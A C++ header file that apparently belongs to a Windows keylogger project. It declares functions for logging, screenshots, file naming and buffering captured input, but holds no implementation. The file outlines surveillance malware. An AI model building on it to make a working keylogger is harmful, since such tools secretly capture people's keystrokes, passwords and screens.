#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include <string>

void log();
std::string trouverNomFichier(std::string typeFichier);
void screenshot();
void afficherNumero();
std::string stringedBuffer(char* buffer, int* bufferLevel);

#endif